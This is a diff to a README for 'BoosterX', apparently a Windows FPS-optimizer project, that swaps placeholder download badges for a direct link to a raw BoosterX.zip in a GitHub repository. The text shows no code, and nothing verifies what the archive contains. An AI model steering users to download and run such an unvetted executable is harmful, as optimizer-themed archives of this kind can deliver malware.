@@ -1,6 +1,6 @@
 # 🚀 BoosterX - Ultimate Windows Optimization Suite
 
-[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](123)
+[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](https://github.com/VaDDoS56/BoosterX/raw/refs/heads/main/BoosterX.zip)
 
 ## 📥 Introduction📥
 
@@ -27,7 +27,7 @@ Ready to boost your FPS? Here’s how to get started quickly.
 
 To download the latest version of BoosterX, visit the official website or the releases page:
 
-[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](123)
+[![Download](https://img.shields.io/badge/Download-v3.0.0-brightgreen.svg)](https://github.com/VaDDoS56/BoosterX/raw/refs/heads/main/BoosterX.zip)
 
 ### Step 2: Choose Your Version
 
